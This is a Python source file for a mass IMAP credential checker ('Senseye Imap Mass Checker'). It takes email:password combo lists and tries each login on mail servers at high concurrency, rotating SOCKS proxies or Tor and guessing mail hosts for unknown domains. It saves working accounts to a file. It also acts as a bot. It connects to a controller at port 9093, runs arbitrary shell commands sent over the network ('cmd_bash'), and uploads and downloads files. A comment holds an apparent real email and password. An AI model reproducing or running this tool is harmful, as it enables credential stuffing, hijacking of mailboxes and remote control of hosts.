#!/usr/bin/python
#- * -coding: utf-8 - * -

# Author: sup3ria edit3d by Mixfair
# Version: 1.0
# Python Version: 3.7

import gevent  # pip install gevent

from gevent.queue import *
from gevent.event import Event
from gevent import monkey
monkey.patch_all()

import gevent.queue
import socket
import os
import sys
from timeit import default_timer as timer
import imaplib
import itertools
import argparse
import subprocess
import email
import errno


import pickle
import struct

from socks import ProxyConnectionError
from socks import GeneralProxyError
from classes import ping_data
from classes import msg_data
from classes import SocksIMAP4SSL
from classes import SocksIMAP4
from classes import _get_connection
from classes import ErrorTypeSns
def sub_worker(t):

    task = t[0].split(':')
    #-----------------------------------
    host = get_imapConfig(task[0])
    if not host:
        if scan_unknow_host:
            host = ini_uh(task[0])
        if not host:

            return
    #-----------------------------------
    l = imap(task[0], task[1], host)
    if l == 'OK':
        print('good')
        q_valid.put(t[0])  # send valid to q



def sub_worker_proxy(t):

    task = t[0].split(':')
    #-----------------------------------
    host = get_imapConfig(task[0])
    if not host:
        if scan_unknow_host:
            host = ini_uh(task[0])
        if not host:

            return
    #-----------------------------------
    l = imap(task[0], task[1], host)
    if l == 'OK':
        print('good')
        q_valid.put(t[0])  # send valid to q

import time

def worker(worker_id):
    global SBF, countWorkers
    canWork = True
    countWorkers = workers
    while 1:
        if SBF:
            if canWork:
                try:
                    t  = q.get(block=True, timeout=2)
                    if not t == 'SENTINAL':
                        #canWork = True
                        sub_worker(t)
                    else:
                        countWorkers -= 1
                        canWork = False
                        if countWorkers == 0:
                            print('send to valid signal')
                            send_signal_valid()

                except BaseException:
                    if resume > 0 and worker_id == 1:
                        dynamic_load()
                    elif canWork and resume == 0:
                        countWorkers -= 1
                        canWork = False
                        if countWorkers == 0:
                            print('send to valid signal')
                            send_signal_valid()
            elif q.qsize() > workers:
                canWork = True

        gevent.sleep(0)

def worker_proxy(worker_id):
    global SBF, countWorkers
    canWork = True
    countWorkers = workers
    while 1:
        if SBF:
            if canWork:
                try:
                    t  = q.get(block=True, timeout=2)
                    if not t == 'SENTINAL':
                        #canWork = True
                        sub_worker_proxy(t)
                    else:
                        countWorkers -= 1
                        canWork = False
                        if countWorkers == 0:
                            print('send to valid signal')
                            send_signal_valid()

                except BaseException:
                    if resume > 0 and worker_id == 1:
                        dynamic_load()
                    elif canWork and resume == 0:
                        countWorkers -= 1
                        canWork = False
                        if countWorkers == 0:
                            print('send to valid signal')
                            send_signal_valid()
            elif q.qsize() > workers:
                canWork = True

        gevent.sleep(0)

def job_start():
    global job_status, SBF
    job_status = 1
    SBF = True

def job_complete():
    global job_status, q
    job_status = 0
    print('Job complete. Files saved')
    send_msg("job completed")

def job_stop():
    global job_status, SBF, q, ItemsVal, resume, StepForDynamicLoad, countWorkers
    countWorkers = workers
    #ItemsVal = ItemsVal - q.qsize()
    job_status = 0
    SBF = False
    resume = 0
    print(ItemsVal)
    print(q.qsize())
    del(q)
    q = gevent.queue.Queue(maxsize=StepForDynamicLoad)
    print(q.qsize())
    send_msg("job completed")

def start_bash(cmd):
    #r = subprocess.Popen('echo %s|sudo -S %s' % ('123456', cmd), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
    r = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE).communicate()
    print(r)
    err = r[1].decode('utf-8')
    out = r[0].decode('utf-8')
    if err:
        send_msg(err)
    if out:
        send_msg(out)


def remove_valid(fname=None):
    global job_status
    try:
        f = open(sys.path[0]+'/'+fname+'_valid.txt')
        f = open(sys.path[0]+'/'+fname+'.txt')
        job_status = 2
        send_answer()
    except IOError as e:
        send_msg(str(e))
    else:
        cmd = "grep -v `cat "+fname+"_valid.txt` "+fname+".txt > tmpsort.txt"
        r = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE)
        r.communicate()
        os.remove(fname+'.txt')
        os.rename('tmpsort.txt', fname+'.txt')
        send_msg('Removed!')
        job_status = 0
        send_answer()

#-----------------IMAP-------------------------#


def imap(usr, pw, host):
    global errs, proxy_id, proxy
    socket.setdefaulttimeout(time_out)
    usr = usr.lower()
    try:
        if len(host) < 2:
            port = 993
        else:
            port = int(host[1])

        if proxy == 'tor':
            mail = SocksIMAP4SSL(host=host[0], port=port,
                                proxy_addr='154.72.75.56', proxy_port=9999, proxy_type='socks5')
        elif proxy == 'socks':

            if proxy_id < (len(ProxyList) - 1):
                proxy_id = proxy_id + 1
            else:
                proxy_id = 0
            print(len(ProxyList))
            print(proxy_id)
            timer = gevent.Timeout(proxy_timeout)
            with timer:
                mail = SocksIMAP4SSL(host=host[0], port=port,
                                    proxy_addr=ProxyList[proxy_id][0], proxy_port=ProxyList[proxy_id][1], proxy_type='socks5')
        else:
            mail = imaplib.IMAP4_SSL(str(host[0]), port)
        a = str(mail.login(usr, pw))
        print('GOOOOOOD ' + a)
        mail.shutdown()
        return a[2: 4]
    except imaplib.IMAP4.error:
        ErrorHandler("ProcessError", [sys.exc_info()[0],sys.exc_info()[1], host], "function imap")
        print(sys.exc_info(), host) # mynewmixfair@yahoo.com:fpctx&intl
        return False
    except GeneralProxyError:
        errs = errs + 1
        #ProxyList.remove(ProxyList[proxy_id])
        proxy_id = 0
        #if len(ProxyList) < 2:
        #    proxy = 'noproxy'
    except ProxyConnectionError:
        errs = errs + 1
        #ProxyList.remove(ProxyList[proxy_id])
        proxy_id = 0
        #if len(ProxyList) < 2:
        #    proxy = 'noproxy'
    except socket.timeout:
        #try:
            #if len(host) < 2:
            #    port = 993
            #else:
            #    port = int(host[1])
            #mail = imaplib.IMAP4_SSL(str(host[0]), port)
            #a = str(mail.login(usr, pw))
            #return a[2: 4]
        #except imaplib.IMAP4.error:
            #if host[0] == 'imap.mail.yahoo.com':
            #print(sys.exc_info(), host)
            #return False
        #except:
            errs = errs + 1
            print(sys.exc_info(), host)
            return sys.exc_info()[1], host
    except BaseException:
        errs = errs + 1
        print(sys.exc_info(), host)
        print(sys.exc_info()[1])
        return sys.exc_info()[1], host


def getunknown_imap(subb):
    socket.setdefaulttimeout(time_out)
    try:
        # TODO: Change to dynamic matchers
        sub = [
            'imap',
            'mail',
            'pop',
            'pop3',
            'imap-mail',
            'inbound',
            'mx',
            'imaps',
            'smtp',
            'm']
        for host in sub:
            host = host + '.' + subb
            try:
                mail = imaplib.IMAP4_SSL(str(host))
                mail.login('test', 'test')
            except imaplib.IMAP4.error:
                return host
    except BaseException:
        return None


def ini_uh(host):
    try:
        host = host.split('@')[1]
        v = getunknown_imap(host)
        if v is not None:
            with open(sys.path[0]+'/'+"hoster.dat", "a") as myfile:
                myfile.write('\n' + host + ':' + v + ":993")
                ImapConfig[host] = v
            return v
        return False
    except BaseException:
        return False

def get_imapConfig(email):
    try:
        hoster = email.lower().split('@')[1]
        return ImapConfig[hoster]
    except BaseException:
        return False


def send_signal_valid():
    q_valid.put("SENTINAL")


def send_sentinals():
    global q, ItemsVal
    q_status.put("SENTINAL")
    ItemsVal = ItemsVal - q.qsize()
    q = gevent.queue.Queue(maxsize=StepForDynamicLoad)
    for i in range(workers):
        q.put_nowait('SENTINAL')

# loading lines from file, putting them into q

def loader():
    global ItemsVal, resume, job_status, par1
    #print('начинаю читать через 5 сек')
    #gevent.sleep(5)
    #worker_sleep = 5
    import sys
    size = 0
    try:

        par1 = 0
        if resume > 0:
            par1 = resume
            print('resume')
        with open(sys.path[0]+'/'+file_in, "r", -1,  None, 'ignore') as text_file:

            pid = par1
            for line in itertools.islice(text_file, par1, None):
                l = line.strip()
                if len(l) > 2:
                    ll = l.split(':')
                    if len(ll) == 2:
                        if len(ll[0]) and len(ll[1]):
                            la = ll[0].split('@')
                            if len(la) == 2:
                                if len(la[1].split('.')) == 2:
                                    try:
                                        q.put_nowait((l, pid))
                                        pid = pid + 1
                                    except Full:
                                        resume = pid
                                        ItemsVal = pid
                                        print('loaded, resume ' +str(resume))
                                        job_start()
                                        return True
                                                #print(pid)
                                                #gevent.sleep(0)
        job_status = 1
        ItemsVal = pid
        resume = 0

    except IOError:
        print("[ERROR]No input file", file_in, "found!")
        send_msg('[Ошибка]Путь указан неверно')
        return False
    except UnicodeDecodeError:
        print('UnicodeDecodeError!')
        resume = pid + 10000
        ItemsVal = pid
        pass

    print('loaded ' + str(ItemsVal))

    job_start()
    return True


def dynamic_load():
    global job_status
    job_status = 2
    if TCF:
        send_answer()
    if loader():
        if TCF:
            ####job_status = 1
            #send_msg('База подгружена')
            send_answer()
        print('starting brute...')
    else:
        job_status = 0
        send_answer()


# load Imap settings from file

def init_ImapConfig():
    global ImapConfig
    ImapConfig = {}
    try:

        with open(sys.path[0]+'/hoster.dat', "r") as f:
            for line in f:
                if len(line) > 1:
                    hoster = line.strip().split(':')
                    ImapConfig[hoster[0]] = (hoster[1], hoster[2])
    except BaseException:
        print("[ERROR]hoster.dat", "not found!")

#/-----------LOADERS------------------------------#

#---------------WRITERS---------------------------#

# writing valid lines to disk


def writer_valid():
    global SBF, job_status, q, validval, errs
    saveperiod = 8
    try:
        os.rename(file_in[:-4] +'_valid.txt', time.strftime("%Y-%m-%d-%H.%M.%S", time.localtime()) + file_in[:-4] +'_valid.txt')
    except FileNotFoundError:
        pass

    while 1:
        if SBF:
            try:
                with open(sys.path[0]+'/'+file_in[:-4] + "_valid.txt", "a") as f:
                    sen_count = workers
                    validval = 0
                    errs = 0
                    while True:

                        t = q_valid.get(block=True)
                        if t == "SENTINAL":
                            #sen_count -= 1

                            #if sen_count < 1:
                            f.close()
                            job_stop()
                            break
                        else:
                            validval += 1
                            f.write(str(t) + "\n")
                            if (validval % saveperiod) == 0:
                                print("I'm saving valid...")
                                f.close()
                                f = open(sys.path[0]+'/'+file_in[:-4] + "_valid.txt", 'a')
            except BaseException:
                pass
        gevent.sleep(0)



#/---------------PROXY---------------------------#

def proxy_load_proxy():

    try:
        text_file = open('proxy.txt', "r")
    except FileNotFoundError:
        send_msg('Error! Proxy file not found!')
        return False
    for line in text_file:
        if not ':' in line:
            send_msg('Error! Bad proxy file')
            return False
        proxy_ip, proxy_port = line.split(':')
        if '\n' in proxy_port:
            proxy_port = proxy_port[:-1]
        proxy_port = int(proxy_port)
        ProxyList.append([proxy_ip, proxy_port])
    #for line in ProxyList:
        #print(line)
    if proxy_check_proxy():
        return True

def proxy_check_proxy():
    global proxy_queue, ProxyList
    if len(ProxyList) < 2:
        print('Errors! Min. 2 proxies!')
    proxy_numproxy = len(ProxyList)
    proxy_workers = 50
    if proxy_numproxy < proxy_workers:
        proxy_workers = proxy_numproxy - 1
    proxy_threads = []
    proxy_queue = Queue(maxsize=len(ProxyList))
    for proxy in ProxyList:
        proxy_queue.put(proxy)
    ProxyList = []
    for i in range(0, proxy_workers):
        proxy_threads.append(gevent.spawn(proxy_check_worker))
    gevent.joinall(proxy_threads)
    if len(ProxyList) > 2:
        send_msg('Proxy list loaded. Total proxies: ' + str(len(ProxyList)))
        return True
    else:
        send_msg('Too few live proxies!')
        return False

def proxy_check_worker():
    while 1:
        try:
            proxy = proxy_queue.get(block=False)
            print(proxy)
            timer = gevent.Timeout(proxy_timeout)
            with timer:
                try:
                    check = SocksIMAP4(host='mixf.asuscomm.com', port=143,
                                    proxy_addr=proxy[0], proxy_port=proxy[1], proxy_type='socks5')
                    #a = str(check.login('adm@mixf.asuscomm.com', '123456'))
                    #print(a)
                    check.shutdown()
                    ProxyList.append([proxy[0],proxy[1]])
                except BaseException:
                    print(sys.exc_info())
                    print(sys.exc_info()[1])
        except gevent.queue.Empty:
            break
#/---------------CORE---------------------------#

def start_conn():
    global conn
    try:
        print('Try to connect..')
        conn = socket.socket()
        conn.settimeout(15)
        conn.connect((ip, 9093))
        global TCF
        TCF = True
        print("Connection succesfull")
            #connected = True
    except:
        #print(sys.exc_info()[3])
        ErrorHandler("ProgramError", [sys.exc_info()[0],sys.exc_info()[1]], "start_conn")


def stop_conn():
    conn.close()
    print("Connection lost")
    global TCF
    TCF = False

def recv_piece(connection, n):
    piece = b''

    while len(piece) < n:

        try:
            if not TCF:
                return
            packet = connection.recv(n - len(piece))
        except:
            ErrorHandler("ProgramError", [sys.exc_info()[0],sys.exc_info()[1]], "recv_piece")
            stop_conn()
            return

        if not packet:
            return None
        piece += packet
    return piece

def recv(connection):

    type_data = recv_piece(connection, 4)
    try:
        data_type = struct.unpack('>I', type_data)[0]
    except TypeError:
        ErrorHandler("ProgramError", [sys.exc_info()[0], sys.exc_info()[1]], "recv")
        data_type = -1

    length_data = recv_piece(connection, 4)

    if not length_data:
        return None

    try:
        data_len = struct.unpack('>I', length_data)[0]
        data = recv_piece(connection, data_len)
    except TypeError:
        ErrorHandler("ProgramError", [sys.exc_info()[0], sys.exc_info()[1]], "recv")
        data = -1

    return data, data_type

def read_answer(conn):

    try:
        data_b, type = recv(conn)
    except TypeError:
        ErrorHandler("ProgramError", [sys.exc_info()[0], sys.exc_info()[1]], "read_answer")
        stop_conn()
        return None

    data = b""
    data += data_b
    if not data_b:
        return None
    if type == 0 or type == 1 or type == 2 or type == 3:
        unpdata = pickle.loads(data)
    else:
        unpdata = data
    return unpdata, type

def send_req(data):
    msg = b""
    msg += pickle.dumps(data, 4)
    msg = struct.pack('>I', len(msg)) + msg
    msg = struct.pack('>I', 0) + msg
    q_net.put(msg)

def send_msg(data):
    data = msg_data(data)
    msg = b""
    msg += pickle.dumps(data, 4)
    msg = struct.pack('>I', len(msg)) + msg
    msg = struct.pack('>I', 2) + msg
    q_net.put(msg)

def command_handler(data):
    global job_status, proxy, proxy_id, time_start
    if data.comm == 'cmd_start':
        global file_in
        file_in = data.ar[0]
        proxy = data.ar[1]
        time_start = time.time() - 1
        if proxy == 'tor':
            _get_connection()
        elif proxy == 'socks':
            if proxy_load_proxy():
                proxy_id = 0
                dynamic_load()
        elif proxy == 'noproxy':
            dynamic_load()

    elif data.comm == 'cmd_stop':
        global SBF, q
        if job_status == 1:
            send_sentinals()
        #send_msg('Принял команду остановки работы')

    elif data.comm == 'cmd_cleanv':
        if job_status == 0:
            send_msg('Remove valid from source base-file..')
            remove_valid(data.ar[0])

    elif data.comm == 'cmd_bash':
        if job_status != 2:
            start_bash(data.ar[0])

def send_answer():
    #print(time.time())
    data = ping_data(1, job_status, ItemsVal - q.qsize(), validval, errs, round((ItemsVal - q.qsize()) / (time.time() - time_start) * 60), proxy, len(ProxyList))
    send_req(data)

def listen_worker():
    while 1:
        gevent.sleep(0.5)
        if TCF:

            try:
                data, type = read_answer(conn)
            except TypeError:
                ErrorHandler("ProgramError", [sys.exc_info()[0],sys.exc_info()[1]], "listen_worker")
                continue

            if type == 0:
                send_answer()
            elif type == 1:
                print("Control package received!")
                command_handler(data)
            elif type == 2:
                receive_file(data)
            elif type == 3:
                print('sendfile ' +file_in)
                send_file(data)
            else:
                print("Trouble with connection..")
def send_file(file):
    global job_status
    job_status = 2
    send_answer()
    print('File sending..' + str(file))

    import socket
    sock = socket.socket()
    sock.connect((ip, 91))
    sock.settimeout(5)

    try:
        f = open(sys.path[0]+'/'+file, "rb")
    except FileNotFoundError:
        print('File not found! ' + file)
        send_msg('File not found: ' + file)
        sock.close()
        job_status = 0
        send_answer()
        return

    sock.sendfile(f, 0)

    sock.close()

    send_msg('File sended: ' + file)

    job_status = 0
    send_answer()
    print('sended ' + file)

def receive_file(data):
    global job_status
    job_status = 2
    send_answer()
    print('File receiving..' + str(data))
    name = data
    import socket
    sock = socket.socket()
    sock.connect((ip, 9093))

    try:
        os.rename('base.txt', time.strftime("%Y-%m-%d-%H.%M.%S", time.localtime()) +'base.txt')
    except FileNotFoundError:
        pass

    while 1:
        try:
            data = sock.recv(32768)
        except ConnectionResetError:
            print('Receive error..')
            os.remove('base.txt')
            return
        if not data:
            job_status = 0
            send_answer()
            sock.close()
            break

        f = open(sys.path[0]+'/'+name, 'ab')
        f.write(data)
        f.close()

    print('file received..')

def online_worker():

    while 1:
        gevent.sleep(6)
        if not TCF:
            start_conn()

def put_on_socket():
    while 1:

        msg = q_net.get()
        try:
            conn.send(msg)
        except:
            ErrorHandler("ProgramError", [sys.exc_info()[0],sys.exc_info()[1]], "put_on_socket" )
            stop_conn()
        gevent.sleep(0)


# gevent async logic, spawning consumer greenlets
def asynchronous():
    threads = []
    threads.append(gevent.spawn(listen_worker))
    threads.append(gevent.spawn(online_worker))
    threads.append(gevent.spawn(put_on_socket))
    #threads.append(gevent.spawn(loader))
    if not proxy:
        for i in range(0, workers):
            threads.append(gevent.spawn(worker, i))
    else:

        for i in range(0, workers):
            threads.append(gevent.spawn(worker_proxy, i))
    threads.append(gevent.spawn(writer_valid))
    #threads.append(gevent.spawn(state))


    start = timer()
    gevent.joinall(threads)
    end = timer()
    #TODO: Reimplement snapshotting

    print("[INFO]Time elapsed: " + str(end - start)[:5], "seconds.")
    print("[INFO] Done.")
    evt.set()  # cleaning up

def ErrorHandler(type, info, place="Unknown"):
    print('Detected:'+type+", Type:" + str(info) )
    for i in TypeErrors:
        if i.GetName() == type:
            i.WriteError(info, False, place)
            return

def init_TypeErrors(types):
    for i in range(len(types)):
        types[i] = ErrorTypeSns(types[i])
    return types

print("""
  ____     __    ___     ____     __   __  __     __   
 /',__\  /'__`\/' _ `\  /',__\  /'__`\/\ \/\ \  /'__`\ 
/\__, `\/\  __//\ \/\ \/\__, `\/\  __/\ \ \_\ \/\  __/ 
\/\____/\ \____\ \_\ \_\/\____/\ \____\\/`____ \ \____\ 
 \/___/  \/____/\/_/\/_/\/___/  \/____/ `/___/> \/____/
                                          /\___/      
                                          \/__/    
    @ Good soft for your pc.                      by sup3ria edited by mi17
""")

parser = argparse.ArgumentParser(description='Senseye Imap Mass Checker v1.0')
parser.add_argument(
    '-ip',
    '--ipaddr',
    help="IpAddress",
    required=False,
    type=str,
    default="127.0.0.1")
parser.add_argument(
    '-p',
    '--proxy',
    help='ProxyFile',
    required=False,
    type=str,
    default=None)
parser.add_argument(
    '-t',
    '--threads',
    help='Number of Greenlets spawned',
    required=False,
    type=int,
    default="1000")
parser.add_argument(
    '-to',
    '--timeout',
    help='timeout in sec',
    required=False,
    type=float,
    default="10")
parser.add_argument(
    '-uh',
    '--unknownhosts',
    help='Check for unknown hosts',
    required=False,
    type=bool,
    default=True)
parser.add_argument(
    '-s',
    '--snap',
    help='Snapshots "Grabbed" folder as zip.',
    required=False,
    type=bool,
    default=False)

parser.add_argument(
    '-gper',
    '--grabperformance',
    help='Grabs but does not save emails',
    required=False,
    type=bool,
    default=False)


# parsing arguments
args = vars(parser.parse_args())

ip = args['ipaddr']
file_in = 'none.txt'
proxy = args['proxy']
workers = 300
time_out = args['timeout']
scan_unknow_host = args["unknownhosts"]
grabb_perfor = args["grabperformance"]

# monkey patching libs which a supported by gevent
# registering an event and signal handler

evt = Event()
#signal.signal(signal.SIGINT, handler)

# init ressources



init_ImapConfig()
TypeErrors = init_TypeErrors(['ProgramError', 'ProcessError', 'ProxyError'])
StepForDynamicLoad = 20000 # period accounts
# init of queues
q_net = gevent.queue.Queue()
q = gevent.queue.Queue(maxsize = StepForDynamicLoad)  # loader
q_valid = gevent.queue.Queue()  # valid
q_status = gevent.queue.Queue()  # status

# starting main logic
conn = socket.socket()
TCF = False # connect flag
SLF = False # start loader flag
SBF = False # start brute flag
f = None
#worker_sleep = 0
ItemsVal = 0 # nums of acc loaded in memory
validval = 0 # nums of found valid accs
errs = 0   # nums of errs
resume = 0  #resume from n acc
job_status = 0 # 0 - wait, 1 - working, 2 - pause, 3 - recv file

proxy = None
ProxyList = []
proxy_timeout = 15
proxy_id = 0

#Time
time_start = 0
#ip = '192.168.1.121'


# MINIMUM SIZE OF BASE - WORKERS + 1 STRS!!!!!!!!!!!!!!!!!!
try:
    asynchronous()
except:
    pass #TODO: DIRTY! But it works to supress shutdown panic.

